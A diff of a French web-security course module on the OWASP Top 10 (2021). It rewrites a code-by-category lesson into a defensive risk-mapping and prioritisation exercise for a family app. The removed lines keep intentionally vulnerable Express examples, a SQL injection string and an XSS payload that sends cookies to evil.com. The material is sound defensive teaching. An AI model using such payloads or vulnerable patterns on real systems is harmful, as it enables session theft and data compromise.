@@ -1,668 +1,243 @@
-# Module 1 — OWASP Top 10 (2021)
+---
+titre: "OWASP Top 10 (2021) — panorama défensif"
+cours: 14-securite-applicative
+notions: ["OWASP Top 10 2021", "A01 Broken Access Control", "A02 Cryptographic Failures", "A03 Injection", "A04 Insecure Design", "A05 Security Misconfiguration", "A06 Vulnerable and Outdated Components", "A07 Identification and Authentication Failures", "A08 Software and Data Integrity Failures", "A09 Security Logging and Monitoring Failures", "A10 SSRF (Server-Side Request Forgery)", "risque = probabilité x impact", "priorisation de remédiation"]
+outcomes:
+  - "sait nommer les 10 catégories OWASP 2021 (A01 à A10) et le risque de chacune"
+  - "sait, pour une vulnérabilité donnée, la classer dans la bonne catégorie OWASP"
+  - "sait citer la parade défensive principale de chaque catégorie"
+  - "sait prioriser une liste de risques par probabilité x impact pour planifier la remédiation"
+prerequis: ["Module 00 — posture sécurité, CIA, defense in depth, moindre privilège"]
+next: 02-injection
+libs: []
+tribuzen: "revue de sécurité transverse de TribuZen — cartographie des risques OWASP sur l'app famille avant durcissement module par module"
+last-reviewed: 2026-07
+---
 
-## Objectifs pédagogiques
+<!-- FLAG-REVIEW: SÉCURITÉ — à valider par Sylvain -->
 
-- Connaître l'OWASP et son rôle dans la sécurité applicative
-- Maîtriser chaque catégorie du Top 10 2021
-- Savoir identifier et prévenir chaque type de vulnérabilité
-- Appliquer ces connaissances dans des projets JavaScript/TypeScript
+# OWASP Top 10 (2021) — panorama défensif
+
+> **Outcomes — tu sauras FAIRE :** nommer les 10 catégories OWASP 2021, classer une vulnérabilité dans la bonne catégorie, citer la parade défensive principale de chacune, prioriser une liste de risques par probabilité × impact.
+> **Difficulté :** :star::star:
+>
+> **Portée :** ce module est un **panorama** — il donne la carte, pas le détail. Chaque catégorie a son module dédié où l'on durcit vraiment le code : **injection → module 02**, **authentification → module 03**, **autorisation / contrôle d'accès → module 04**, **cryptographie → module 05**, **headers & misconfiguration → module 06**, **supply chain / composants → module 09**. Ici, l'objectif est de **savoir situer un risque** et de **prioriser** ce qu'on va corriger en premier. Angle **100 % défensif** : on montre une faille pour la **comprendre et la corriger**, jamais pour l'exploiter contre un tiers.
+
+## 1. Cas concret d'abord
+
+Tu arrives sur TribuZen (app d'organisation familiale — agendas partagés, listes, **données d'enfants**). La CTO te confie une première mission avant toute nouvelle feature :
+
+> « Fais-moi une **revue de sécurité rapide** de l'app. Je veux une liste des risques classés OWASP, et surtout **par quoi commencer**. On a des données de familles et de mineurs, je ne veux pas de mauvaise surprise. »
+
+Tu ouvres le code et tu notes, pêle-mêle :
+
+1. L'endpoint `GET /api/families/:id/children` renvoie les enfants **sans vérifier** que la famille appartient bien à l'utilisateur connecté (un `familyId` deviné donne accès aux enfants d'une autre famille).
+2. Les mots de passe sont hachés en **MD5**.
+3. La recherche fait `... WHERE name LIKE '%' + req.query.q + '%'` (concaténation de chaîne dans la requête SQL).
+4. Le reset de mot de passe repose sur une **question secrète** (« nom de ton premier animal »).
+5. Aucun **header de sécurité** (pas de CSP, `cors({ origin: '*' })`).
+6. `npm audit` remonte **3 vulnérabilités dont 1 critique**.
+7. Pas de **rate limiting** sur `/api/login`.
+8. Les webhooks entrants ne **vérifient aucune signature**.
+9. **Aucun log** des échecs d'authentification ni des accès refusés.
+10. Un endpoint « aperçu de lien » fait `axios.get(url)` sur une **URL fournie par l'utilisateur**.
+
+Dix problèmes, dix catégories OWASP — ce n'est pas un hasard. À la fin de ce module, tu sauras **coller une étiquette A0x sur chacun**, dire **la parade**, et surtout répondre à la vraie question de la CTO : **par quoi commencer ?**
 
 ---
 
-## 1. Qu'est-ce que l'OWASP ?
+## 2. Théorie complète, concise
 
-L'**OWASP** (Open Web Application Security Project) est une fondation à but non lucratif qui travaille à améliorer la sécurité des logiciels. Son projet phare est le **Top 10**, une liste des dix risques de sécurité les plus critiques pour les applications web, mise à jour tous les 3-4 ans.
+### 2.0 Ce qu'est l'OWASP Top 10 (et ce qu'il n'est pas)
 
-### Évolution du Top 10
+L'**OWASP** (Open Worldwide Application Security Project) est une fondation à but non lucratif. Son document phare, le **Top 10**, est une **liste de sensibilisation** : les dix **catégories de risques** de sécurité web les plus critiques, révisée tous les 3-4 ans (**édition de référence 2021** ; une Release Candidate 2025 est en cours de publication — ce module reste basé sur l'édition 2021, stable et citée en entretien). Chaque entrée regroupe plusieurs CWE (types de faiblesses).
 
-Le Top 10 2021 a intégré de nouvelles catégories reflétant l'évolution des menaces :
+> Ce n'est **pas** une checklist exhaustive ni une certification. C'est un **socle commun** : le vocabulaire minimal qu'un dev backend doit partager avec les auditeurs. Le référentiel exhaustif pour vérifier une app est l'**ASVS**, et les recettes détaillées sont dans les **Cheat Sheets** OWASP (voir §fin).
+
+Une catégorie OWASP se lit toujours en deux temps, et c'est **le second qui compte pour nous** :
+- **le risque** — ce qui peut mal tourner ;
+- **la parade défensive** — ce qu'on met en place pour l'empêcher ou le détecter.
+
+### 2.1 Les 10 catégories 2021 (liste officielle exacte)
+
+Ordre officiel = par prévalence / criticité constatée dans les données OWASP 2021.
+
+| Code | Catégorie officielle | Le risque, en une phrase | Parade défensive principale | Détail |
+|------|----------------------|--------------------------|------------------------------|--------|
+| **A01** | Broken Access Control | Un utilisateur accède à des ressources ou actions qui ne lui sont pas autorisées. | **Deny by default**, vérifier l'autorisation **côté serveur** à chaque accès. | module 04 |
+| **A02** | Cryptographic Failures | Des données sensibles sont exposées faute de chiffrement / hachage corrects. | Hachage fort des mots de passe, TLS partout, clés hors du code. | module 05 |
+| **A03** | Injection | Une entrée non fiable est interprétée comme du code/commande (SQLi, XSS…). | **Requêtes paramétrées**, échappement contextuel de la sortie, validation. | module 02 |
+| **A04** | Insecure Design | La faille est dans la **conception**, pas dans l'implémentation. | **Threat modeling** en amont, patterns sûrs, limites de ressources. | ce module + 00 |
+| **A05** | Security Misconfiguration | Config par défaut / permissive : headers absents, verbosité, comptes par défaut. | Durcissement reproductible, surface minimale, headers de sécurité. | module 06 |
+| **A06** | Vulnerable and Outdated Components | Une dépendance a une vulnérabilité **connue** et publique. | Inventaire (SBOM), `npm audit`, veille CVE, mise à jour. | module 09 |
+| **A07** | Identification and Authentication Failures | L'authentification peut être contournée / brute-forcée. | MFA, mots de passe forts, **rate limiting**, sessions gérées serveur. | module 03 |
+| **A08** | Software and Data Integrity Failures | On fait confiance à du code/donnée dont l'intégrité n'est pas vérifiée. | Signatures, **SRI**, CI/CD durci, pas de désérialisation non fiable. | module 09 |
+| **A09** | Security Logging and Monitoring Failures | Sans logs ni alertes, les attaques passent inaperçues. | Logger les événements de sécurité, centraliser, **alerter**. | module 11 |
+| **A10** | Server-Side Request Forgery (SSRF) | Le serveur va chercher une URL fournie par l'utilisateur → accès interne. | **Allow-list** de destinations, bloquer IP privées & métadonnées cloud. | module 08 / 10 |
+
+> **À mémoriser exactement.** Les titres ci-dessus sont les intitulés officiels OWASP 2021 (source : owasp.org/Top10/2021). Ne les paraphrase pas en entretien : « A03 Injection », « A10 SSRF », etc.
+
+### 2.2 Ce qui a changé depuis 2017 (pour la culture, pas par cœur)
+
+Trois évolutions racontent l'histoire des menaces modernes :
+
+- **A01 Broken Access Control** est **monté au 1er rang** (5ᵉ en 2017) — c'est aujourd'hui le risque le plus répandu.
+- **A04 Insecure Design** est **nouveau** : OWASP reconnaît qu'une implémentation parfaite ne rattrape **jamais** un design non sûr.
+- **A10 SSRF** est **nouveau** aussi, poussé par le cloud (métadonnées d'instance, réseaux internes).
+
+`XSS` a fusionné dans **A03 Injection**, et `XXE` dans **A05 Security Misconfiguration**.
+
+### 2.3 Comment on **priorise** (le cœur du métier)
+
+Connaître les 10 catégories ne suffit pas : en revue, on te demandera **par quoi commencer**. La règle universelle :
+
+> **Risque = Probabilité × Impact.**
+
+- **Probabilité** — à quel point c'est facile/probable d'être touché (faille exposée sur Internet ? exploit public ? authentification requise ?).
+- **Impact** — ce qu'on perd si ça arrive (fuite de données d'enfants = impact maximal sur TribuZen ; défiguration d'une page marketing = faible).
+
+On classe ensuite en niveaux : **Critique / Haute / Moyenne / Base**. Deux principes défensifs orientent le tri :
+
+1. **Ce qui protège des données sensibles passe devant.** Sur TribuZen, tout ce qui touche aux enfants et aux comptes familiaux monte d'un cran.
+2. **À impact égal, on corrige d'abord le facile et exposé.** Ajouter `helmet()` ou un rate limiter coûte une heure ; refondre un design non sûr (A04) coûte des semaines — mais reste à planifier.
+
+### 2.4 Angle défensif : la posture, pas l'exploit
+
+Tout au long de ce cours, on regarde une faille pour **la refermer**. Concrètement, chaque catégorie se traite avec **le même réflexe en trois temps** :
+
+1. **Détecter** — où, dans mon code, cette catégorie peut-elle mordre ? (revue, `npm audit`, tests).
+2. **Prévenir** — la parade par défaut (deny by default, requête paramétrée, TLS, allow-list…).
+3. **Surveiller** — logguer et alerter pour voir si on est attaqué (A09 est transverse : il rend les 9 autres **détectables**).
+
+---
+
+## 3. Worked examples
+
+### Exemple 1 — Étiqueter les 10 problèmes de TribuZen
+
+On reprend la liste du §1 et on colle l'étiquette OWASP + la parade. **C'est exactement l'exercice de revue attendu en poste.**
+
+| # | Constat TribuZen | Catégorie | Parade défensive (le « quoi faire ») |
+|---|------------------|-----------|--------------------------------------|
+| 1 | `/families/:id/children` sans vérif de propriété | **A01** Broken Access Control | Vérifier côté serveur que `family.ownerId === req.user.id` ; deny by default. |
+| 2 | Mots de passe en **MD5** | **A02** Cryptographic Failures | Re-hacher avec **bcrypt/argon2**, jamais MD5/SHA1 pour un mot de passe. |
+| 3 | SQL par **concaténation** de `req.query.q` | **A03** Injection | **Requête paramétrée** (`WHERE name LIKE $1`), pas de concaténation. |
+| 4 | Reset via **question secrète** | **A04** Insecure Design | Repenser le flux : **token à usage unique, expirant**, envoyé par email. |
+| 5 | Pas de headers, `cors({ origin: '*' })` | **A05** Security Misconfiguration | `helmet()`, CORS restreint à l'origine du front, pas de stack trace en prod. |
+| 6 | `npm audit` : 1 critique | **A06** Vulnerable Components | Mettre à jour / `overrides`, veille CVE (Dependabot). |
+| 7 | Pas de rate limiting sur `/login` | **A07** Auth Failures | Rate limiter + verrou temporaire de compte, MFA. |
+| 8 | Webhooks sans **signature** | **A08** Integrity Failures | Vérifier une signature HMAC en **timing-safe** avant de traiter. |
+| 9 | Aucun log des échecs d'auth | **A09** Logging Failures | Logger login/échecs/accès refusés en JSON, centraliser, alerter. |
+| 10 | « Aperçu de lien » `axios.get(url)` | **A10** SSRF | **Allow-list** de domaines, bloquer IP privées & `169.254.169.254`. |
+
+> Remarque : le problème #2 (MD5) touche A02 **et** A07 (mécanisme d'auth faible). Une même faille peut relever de plusieurs catégories — on retient la **dominante** (ici le défaut cryptographique) et on note la seconde.
+
+### Exemple 2 — Prioriser pour répondre « par quoi on commence ? »
+
+On applique **Risque = Probabilité × Impact**, en majorant l'impact quand des **données d'enfants** sont en jeu.
+
+| Rang | # / Catégorie | Probabilité | Impact | Niveau | Pourquoi ce rang |
+|------|---------------|-------------|--------|--------|------------------|
+| 1 | #1 A01 (accès enfants) | Haute (ID devinable, exposé) | **Critique** (données mineurs) | 🔴 Critique | Exposé + données les plus sensibles → **on commence ici**. |
+| 2 | #3 A03 (SQLi) | Haute (endpoint public) | Critique (base entière) | 🔴 Critique | Une injection peut tout compromettre. |
+| 3 | #2 A02 (MD5) | Moyenne (nécessite une fuite) | Critique (tous les comptes) | 🟠 Haute | À corriger vite, mais après avoir fermé l'accès direct. |
+| 4 | #7 A07 (pas de rate limit) | Haute | Haute (prise de compte) | 🟠 Haute | Parade **rapide** (1 middleware) → excellent ratio effort/gain. |
+| 5 | #5 A05 (headers/CORS) | Haute | Moyenne | 🟡 Moyenne | `helmet()` : quelques minutes, à faire tout de suite aussi. |
+| 6 | #6 A06 (dépendance critique) | Moyenne | Variable | 🟡 Moyenne | Dépend de la CVE ; `npm audit fix` d'abord. |
+| 7 | #10 A10 (SSRF) | Moyenne | Haute (métadonnées cloud) | 🟡 Moyenne | Critique si déployé en cloud → allow-list. |
+| 8 | #8 A08 (webhooks) | Faible/Moyenne | Haute | 🟡 Moyenne | Vérifier la signature avant traitement. |
+| 9 | #4 A04 (design reset) | Moyenne | Haute | 🔵 Base | Vrai chantier de **conception** → planifier, pas patcher. |
+| 10 | #9 A09 (logs) | — | — (transverse) | 🔵 Base mais **prioritaire au sens support** | Sans logs, on ne **voit** aucune des 9 autres → à installer en parallèle. |
+
+**Réponse à la CTO :** « On ferme d'abord l'accès direct aux enfants (A01) et l'injection SQL (A03) — exposés et critiques. En parallèle, deux quick wins à effort quasi nul : `helmet()` (A05) et le rate limiter sur `/login` (A07). On rehash les mots de passe (A02) dans la foulée. Le reste est planifié ; le reset par question secrète (A04) est un chantier de refonte, pas un patch. Et on **installe le logging de sécurité (A09) dès maintenant** pour détecter toute tentative pendant qu'on corrige. »
+
+---
+
+## 4. Pièges & misconceptions
+
+### PIÈGE #1 — Croire que le Top 10 est une checklist « fait / pas fait »
+
+Le Top 10 est un document de **sensibilisation**, pas un standard de vérification. Cocher les 10 cases ne veut pas dire « app sécurisée ». Pour une vérification structurée, on utilise l'**ASVS** (Application Security Verification Standard). Le Top 10 sert à **parler le même langage** et à prioriser, rien de plus.
+
+### PIÈGE #2 — Confondre A01 (autorisation) et A07 (authentification)
+
+- **A07 Authentication** = « **es-tu bien qui tu prétends être ?** » (login, mot de passe, MFA, sessions).
+- **A01 Access Control** = « **une fois identifié, as-tu le droit de faire ça ?** » (accéder à *cette* famille, supprimer *cet* enfant).
+
+L'endpoint TribuZen #1 est authentifié (l'utilisateur est connecté) mais **mal autorisé** (il accède à une autre famille) → c'est **A01**, pas A07.
+
+### PIÈGE #3 — Penser que « le framework me protège » dispense de tout
+
+Un ORM protège de beaucoup d'injections SQL **si on l'utilise correctement** (une requête raw concaténée reste vulnérable). Vue/React échappent le HTML par défaut **sauf** `v-html` / `dangerouslySetInnerHTML`. Le framework **réduit** la surface ; il ne remplace pas la revue. La misconfiguration (A05) naît justement de la confiance aveugle dans les défauts.
+
+### PIÈGE #4 — Négliger A09 parce qu'il « n'empêche pas d'attaque »
+
+A09 (Logging & Monitoring) ne bloque effectivement rien **au moment** de l'attaque. Mais sans lui, une brèche reste invisible en moyenne des mois. C'est le prérequis pour **détecter** les 9 autres. Le classer « base » sur l'impact direct mais le **traiter tôt** n'est pas contradictoire : c'est un socle, pas une rustine.
+
+### PIÈGE #5 — Prioriser par le numéro de catégorie
+
+A01 > A10 dans la liste **ne veut pas dire** « corrige A01 avant A10 chez toi ». L'ordre OWASP est une **prévalence mondiale moyenne**. Ta priorité dépend de **ton** exposition et de **ton** impact (Risque = Proba × Impact). Sur une app cloud, un SSRF (A10) peut être ta priorité n°1.
+
+### PIÈGE #6 — Écrire un exploit « pour tester »
+
+Angle défensif : on **ne rédige pas** de payload d'attaque prêt à lancer contre un système qu'on ne possède pas (c'est illégal et hors sujet). On reproduit une faille **dans son propre bac à sable** pour la **comprendre et la corriger**, et on teste avec des outils dédiés (SAST/DAST — module 11) sur **ses** environnements.
+
+---
+
+## 5. Ancrage TribuZen
+
+Ce module est le **point de départ de tout le cours sécurité** appliqué à TribuZen. Le livrable concret est une **cartographie des risques** — un document vivant qui pilote l'ordre des modules suivants.
+
+TribuZen manipule des **données de familles et de mineurs** : la CNIL et le RGPD imposent une vigilance renforcée. Concrètement, l'impact d'une fuite est **toujours majoré**, ce qui remonte mécaniquement les catégories touchant à ces données (A01, A02, A03) en tête de priorité.
+
+Fichier cible dans `smaurier/tribuzen` (artefact de revue, versionné avec le code) :
 
 ```
-2017                              2021
-─────────────────────────────     ──────────────────────────────
-A1: Injection                  →  A03: Injection (↓)
-A2: Broken Authentication      →  A07: Auth Failures (↓)
-A3: Sensitive Data Exposure     →  A02: Crypto Failures (↑)
-A4: XXE                        →  (fusionné dans A05)
-A5: Broken Access Control       →  A01: Broken Access Control (↑↑)
-A6: Security Misconfiguration   →  A05: Security Misconfig (↓)
-A7: XSS                        →  (fusionné dans A03)
-A8: Insecure Deserialization   →  A08: Integrity Failures
-A9: Known Vulnerabilities       →  A06: Vulnerable Components (↑)
-A10: Logging & Monitoring      →  A09: Logging Failures (↓)
-                                   A04: Insecure Design (NOUVEAU)
-                                   A10: SSRF (NOUVEAU)
+tribuzen/
+  docs/
+    security/
+      owasp-risk-map.md      ← la cartographie du lab (constat → A0x → parade → priorité)
+      threat-model.md        ← issu du module 00 (Insecure Design / A04)
+```
+
+Le tableau de l'Exemple 2 **est** la première version de `owasp-risk-map.md`. Chaque module suivant du cours en referme une ligne :
+- module 02 → ferme la ligne **A03** (injection),
+- module 03 → **A07** (auth), module 04 → **A01** (accès),
+- module 05 → **A02** (crypto), module 06 → **A05** (headers/misconfig),
+- module 09 → **A06/A08** (supply chain & intégrité), module 11 → **A09** (audit & logs).
+
+> Ainsi le fil rouge n'est pas décoratif : la carte OWASP se **vide** au fil du cours, chaque risque étant durci dans son module dédié.
+
+---
+
+## 6. Points clés
+
+1. L'OWASP Top 10 (2021) = **10 catégories de risques** web, document de **sensibilisation** (pas une checklist ni une certif).
+2. Liste exacte à connaître : **A01** Broken Access Control, **A02** Cryptographic Failures, **A03** Injection, **A04** Insecure Design, **A05** Security Misconfiguration, **A06** Vulnerable and Outdated Components, **A07** Identification and Authentication Failures, **A08** Software and Data Integrity Failures, **A09** Security Logging and Monitoring Failures, **A10** SSRF.
+3. **A01** est le risque n°1 en 2021 (contrôle d'accès) ; **A04** (Insecure Design) et **A10** (SSRF) sont les **nouveautés** 2021.
+4. Chaque catégorie se lit **risque → parade défensive** ; c'est la parade qui nous intéresse.
+5. Ne pas confondre **A07 authentification** (« qui es-tu ? ») et **A01 autorisation** (« as-tu le droit ? »).
+6. On priorise par **Risque = Probabilité × Impact**, pas par le numéro de catégorie — et on majore l'impact quand des données sensibles (enfants) sont en jeu.
+7. **A09 (logging)** n'empêche pas une attaque mais rend les 9 autres **détectables** → socle à installer tôt.
+8. Posture **défensive** : reproduire une faille dans **son** bac à sable pour la corriger, jamais l'exploiter chez un tiers.
+
+---
+
+## 7. Seeds Anki
+
+```
+Combien de catégories dans l'OWASP Top 10, et à quoi sert-il ?|10 catégories de risques de sécurité web. C'est un document de SENSIBILISATION (vocabulaire commun + priorisation), pas une checklist exhaustive ni une certification — pour vérifier une app, on utilise l'ASVS.
+Quelle est la catégorie OWASP n°1 en 2021 et pourquoi ?|A01 Broken Access Control — montée du 5e (2017) au 1er rang car c'est le risque le plus répandu : un utilisateur accède à des ressources/actions non autorisées.
+Quelles sont les deux nouvelles catégories de l'OWASP Top 10 2021 ?|A04 Insecure Design (la faille est dans la conception, pas l'implémentation) et A10 SSRF (Server-Side Request Forgery), poussé par le cloud.
+Différence entre A07 et A01 en une phrase ?|A07 Authentication = "es-tu bien qui tu prétends être ?" (login/MFA/session). A01 Access Control = "une fois identifié, as-tu le droit de faire cette action sur cette ressource ?".
+Quelle formule sert à prioriser les vulnérabilités, et pourquoi pas l'ordre A01..A10 ?|Risque = Probabilité x Impact. L'ordre OWASP est une prévalence mondiale moyenne ; la priorité réelle dépend de TON exposition et de TON impact (ex: SSRF peut être n°1 en cloud).
+Cite la parade défensive principale de A03 Injection.|Requêtes paramétrées (jamais de concaténation de chaîne), plus échappement contextuel de la sortie et validation des entrées. Détail au module 02.
+Pourquoi installer A09 (logging & monitoring) tôt même s'il "n'empêche rien" ?|Il ne bloque pas l'attaque au moment T, mais sans logs une brèche reste invisible des mois. C'est le socle qui rend les 9 autres catégories DÉTECTABLES.
+En posture défensive, que fait-on avec une faille — et que ne fait-on jamais ?|On la reproduit dans son PROPRE bac à sable pour la comprendre et la corriger (détecter → prévenir → surveiller). On n'écrit jamais de payload d'attaque prêt à lancer contre un système tiers.
 ```
 
 ---
 
-## A01 — Broken Access Control
+## Pont vers le lab
 
-### Description
-
-Le contrôle d'accès applique les politiques qui déterminent ce qu'un utilisateur peut faire. Quand il est défaillant, des utilisateurs peuvent accéder à des ressources non autorisées.
-
-**Montée de la 5ᵉ à la 1ʳᵉ place** — c'est la vulnérabilité la plus répandue.
-
-### Exemple vulnérable
-
-```typescript
-// ❌ IDOR (Insecure Direct Object Reference)
-// N'importe quel utilisateur authentifié peut accéder aux données d'un autre
-app.get('/api/users/:id/invoices', authenticateJWT, async (req, res) => {
-  const invoices = await db.query(
-    'SELECT * FROM invoices WHERE user_id = $1',
-    [req.params.id] // Pas de vérification que c'est le bon utilisateur
-  );
-  res.json(invoices);
-});
-```
-
-### Correction
-
-```typescript
-// ✅ Vérifier que l'utilisateur accède à ses propres données
-app.get('/api/users/:id/invoices', authenticateJWT, async (req, res) => {
-  if (req.user.id !== parseInt(req.params.id) && req.user.role !== 'admin') {
-    return res.status(403).json({ error: 'Accès interdit' });
-  }
-  const invoices = await db.query(
-    'SELECT * FROM invoices WHERE user_id = $1',
-    [req.params.id]
-  );
-  res.json(invoices);
-});
-```
-
-### Prévention
-
-- Refuser par défaut (deny by default), sauf pour les ressources publiques
-- Vérifier l'autorisation côté serveur systématiquement
-- Utiliser des identifiants indirects (UUID plutôt que ID auto-incrémenté)
-- Désactiver le directory listing sur le serveur web
-- Logger les échecs de contrôle d'accès et alerter les administrateurs
-
----
-
-## A02 — Cryptographic Failures
-
-### Description
-
-Anciennement « Sensitive Data Exposure ». Cette catégorie concerne les échecs liés à la cryptographie qui mènent à l'exposition de données sensibles.
-
-### Exemple vulnérable
-
-```typescript
-// ❌ Stockage de mot de passe en clair ou avec un hash faible
-import crypto from 'node:crypto';
-
-function hashPassword(password: string): string {
-  return crypto.createHash('md5').update(password).digest('hex');
-  // MD5 n'est pas adapté au hashing de mots de passe
-}
-
-// ❌ Données sensibles transmises sans chiffrement
-// HTTP au lieu de HTTPS
-
-// ❌ Clé de chiffrement hardcodée
-const SECRET_KEY = 'ma-super-cle-secrete-123';
-```
-
-### Correction
-
-```typescript
-// ✅ Utiliser bcrypt ou argon2 pour les mots de passe
-import bcrypt from 'bcrypt';
-
-async function hashPassword(password: string): Promise<string> {
-  return bcrypt.hash(password, 12); // cost factor de 12
-}
-
-async function verifyPassword(password: string, hash: string): Promise<boolean> {
-  return bcrypt.compare(password, hash);
-}
-
-// ✅ Clés depuis les variables d'environnement
-const SECRET_KEY = process.env.ENCRYPTION_KEY;
-if (!SECRET_KEY) throw new Error('ENCRYPTION_KEY non définie');
-```
-
-### Prévention
-
-- Classifier les données traitées (données personnelles, données sensibles, etc.)
-- Ne pas stocker de données sensibles inutilement
-- Chiffrer les données sensibles au repos (AES-256-GCM)
-- Imposer HTTPS partout avec HSTS
-- Utiliser des algorithmes modernes et éprouvés
-- Gérer les clés correctement (rotation, stockage sécurisé)
-
----
-
-## A03 — Injection
-
-### Description
-
-L'injection se produit quand des données non fiables sont envoyées à un interpréteur dans le cadre d'une commande ou d'une requête. Inclut SQL injection, XSS, command injection, etc.
-
-### Exemple vulnérable
-
-```typescript
-// ❌ SQL Injection
-app.get('/api/search', async (req, res) => {
-  const query = `SELECT * FROM products WHERE name LIKE '%${req.query.q}%'`;
-  const results = await db.query(query);
-  // Si q = "'; DROP TABLE products; --", la table est supprimée
-  res.json(results);
-});
-
-// ❌ XSS (Cross-Site Scripting)
-app.get('/search', (req, res) => {
-  res.send(`<h1>Résultats pour : ${req.query.q}</h1>`);
-  // Si q = "<script>document.location='https://evil.com/steal?c='+document.cookie</script>"
-});
-```
-
-### Correction
-
-```typescript
-// ✅ Requêtes paramétrées
-app.get('/api/search', async (req, res) => {
-  const results = await db.query(
-    'SELECT * FROM products WHERE name LIKE $1',
-    [`%${req.query.q}%`]
-  );
-  res.json(results);
-});
-
-// ✅ Échappement automatique avec un framework de templating
-// ou utilisation de bibliothèques de sanitization
-import DOMPurify from 'isomorphic-dompurify';
-const safeHTML = DOMPurify.sanitize(userInput);
-```
-
-### Prévention
-
-- Utiliser des requêtes paramétrées ou un ORM
-- Valider et sanitizer toutes les entrées utilisateur
-- Échapper les sorties selon le contexte (HTML, URL, JS, CSS, SQL)
-- Utiliser des Content Security Policy (CSP) contre XSS
-- Voir le **Module 02** pour un traitement approfondi
-
----
-
-## A04 — Insecure Design
-
-### Description
-
-**Nouvelle catégorie en 2021.** Se concentre sur les risques liés à des défauts de conception et d'architecture, plutôt qu'à des erreurs d'implémentation. Aucune implémentation parfaite ne peut corriger un design fondamentalement non sécurisé.
-
-### Exemple de design non sécurisé
-
-```typescript
-// ❌ Design non sécurisé : récupération de mot de passe basée sur des questions
-// "Quel est le nom de votre premier animal ?" — facilement trouvable sur les réseaux sociaux
-app.post('/api/reset-password', async (req, res) => {
-  const { email, securityAnswer, newPassword } = req.body;
-  const user = await findUser(email);
-  if (user.securityAnswer === securityAnswer) {
-    await updatePassword(user.id, newPassword);
-    return res.json({ message: 'Mot de passe mis à jour' });
-  }
-  // Pas de rate limiting, pas de notification, pas de 2FA
-});
-```
-
-### Design sécurisé
-
-```typescript
-// ✅ Design sécurisé : token temporaire envoyé par email
-app.post('/api/forgot-password', rateLimiter, async (req, res) => {
-  const { email } = req.body;
-  const user = await findUser(email);
-  if (user) {
-    const token = crypto.randomBytes(32).toString('hex');
-    await saveResetToken(user.id, token, Date.now() + 3600_000); // expire 1h
-    await sendResetEmail(email, token);
-  }
-  // Toujours répondre pareil pour ne pas révéler si l'email existe
-  res.json({ message: 'Si un compte existe, un email a été envoyé' });
-});
-```
-
-### Prévention
-
-- Intégrer le threat modeling dès la phase de conception
-- Établir un cycle de développement sécurisé (Secure SDLC)
-- Utiliser des design patterns sécurisés éprouvés
-- Limiter la consommation de ressources par utilisateur/service
-- Séparer les couches (tiers architecture) avec des contrôles entre chaque couche
-
----
-
-## A05 — Security Misconfiguration
-
-### Description
-
-L'application est vulnérable si elle est mal configurée au niveau de la stack applicative : serveur, framework, base de données, cloud, etc.
-
-### Exemple vulnérable
-
-```typescript
-// ❌ Headers de sécurité manquants
-const app = express();
-
-// ❌ Stack trace exposée en production
-app.use((err, req, res, next) => {
-  res.status(500).json({
-    error: err.message,
-    stack: err.stack, // Fuite d'information interne
-  });
-});
-
-// ❌ CORS trop permissif
-app.use(cors({ origin: '*' }));
-
-// ❌ Credentials par défaut non changées
-// MongoDB sans authentification, Redis sans mot de passe
-```
-
-### Correction
-
-```typescript
-import helmet from 'helmet';
-
-const app = express();
-
-// ✅ Helmet ajoute automatiquement les headers de sécurité
-app.use(helmet());
-
-// ✅ Gestion d'erreur qui ne fuit pas d'information
-app.use((err, req, res, next) => {
-  console.error(err); // Logger côté serveur uniquement
-  res.status(500).json({ error: 'Erreur interne du serveur' });
-});
-
-// ✅ CORS restrictif
-app.use(cors({
-  origin: ['https://monapp.com'],
-  methods: ['GET', 'POST', 'PUT', 'DELETE'],
-  credentials: true,
-}));
-```
-
-### Prévention
-
-- Processus de hardening reproductible et automatisé
-- Pas de fonctionnalités inutiles installées (surface d'attaque minimale)
-- Revue régulière des configurations (cloud, serveur, framework)
-- Architecture segmentée avec séparation des environnements
-- Envoi automatique de directives de sécurité et headers
-
----
-
-## A06 — Vulnerable and Outdated Components
-
-### Description
-
-Utiliser des composants (librairies, frameworks) avec des vulnérabilités connues. C'est une cible facile car les exploits sont souvent publics.
-
-### Détection
-
-```bash
-# Vérifier les vulnérabilités des dépendances npm
-npm audit
-
-# Exemple de sortie
-# found 3 vulnerabilities (1 low, 1 moderate, 1 critical)
-#   critical: prototype-pollution in lodash <4.17.21
-
-# Corriger automatiquement quand possible
-npm audit fix
-```
-
-### Bonnes pratiques
-
-```json
-// package.json — utiliser des ranges de version strictes
-{
-  "dependencies": {
-    "express": "^4.21.0",
-    "helmet": "^7.1.0"
-  },
-  "overrides": {
-    "semver": ">=7.5.4"
-  }
-}
-```
-
-### Prévention
-
-- Inventorier toutes les dépendances (SBOM — Software Bill of Materials)
-- Supprimer les dépendances inutilisées
-- Surveiller en continu les CVE (Dependabot, Snyk, Socket)
-- Automatiser les mises à jour avec des PR automatiques
-- Préférer des composants activement maintenus et largement adoptés
-- Tester les mises à jour dans un pipeline CI avant le merge
-
----
-
-## A07 — Identification and Authentication Failures
-
-### Description
-
-Faiblesses dans les mécanismes d'authentification permettant à un attaquant d'usurper l'identité d'un utilisateur légitime.
-
-### Exemples de failles
-
-```typescript
-// ❌ Pas de protection contre le brute force
-app.post('/api/login', async (req, res) => {
-  const { email, password } = req.body;
-  const user = await findUser(email);
-  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
-    return res.status(401).json({ error: 'Email ou mot de passe incorrect' });
-    // Message générique — bien. Mais pas de rate limiting — mal.
-  }
-  const token = generateJWT(user);
-  res.json({ token });
-});
-```
-
-### Correction
-
-```typescript
-import rateLimit from 'express-rate-limit';
-
-// ✅ Rate limiting sur le login
-const loginLimiter = rateLimit({
-  windowMs: 15 * 60 * 1000,
-  max: 5,
-  message: { error: 'Trop de tentatives, réessayez dans 15 minutes' },
-  standardHeaders: true,
-  keyGenerator: (req) => req.body.email || req.ip, // Par email OU par IP
-});
-
-app.post('/api/login', loginLimiter, async (req, res) => {
-  const { email, password } = req.body;
-  const user = await findUser(email);
-  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
-    return res.status(401).json({ error: 'Identifiants invalides' });
-  }
-  // ✅ Vérifier le MFA si activé
-  if (user.mfaEnabled) {
-    return res.json({ requireMFA: true, tempToken: generateTempToken(user) });
-  }
-  const token = generateJWT(user);
-  res.json({ token });
-});
-```
-
-### Prévention
-
-- Implémenter le MFA (authentification multi-facteurs)
-- Ne pas livrer avec des credentials par défaut
-- Vérifier la force des mots de passe (longueur minimale 12 caractères)
-- Limiter les tentatives de connexion (rate limiting, account lockout temporaire)
-- Utiliser un gestionnaire de sessions sécurisé côté serveur
-- Voir le **Module 03** pour un traitement approfondi
